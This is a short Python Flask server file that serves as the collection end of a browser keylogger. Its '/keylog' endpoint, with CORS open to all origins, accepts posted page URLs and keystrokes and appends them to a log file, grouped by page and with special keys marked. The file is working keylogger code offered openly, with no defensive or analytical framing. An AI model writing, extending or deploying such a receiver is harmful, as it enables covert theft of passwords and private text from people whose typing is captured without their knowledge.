from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

now = ''

@app.route('/keylog', methods=['POST'])
def keylog():
    data = request.json
    url = data['url']
    keys = data['keys']
  
    print(f'{url}: {keys}')
    global now

    with open('./keylog.txt', 'a') as log:
        if now != url:
            now = url
            log.write('\nNow in page : ' + url + '\n')

        if keys == 'Tab':
            log.write('\t')
        elif keys == 'Enter':
            log.write('\n')
        elif len(keys) != 1:
            log.write('[' + keys + ']')        
        else:
            log.write(keys)

    return "OK"

app.run(host='127.0.0.1', port=8000, debug=True)
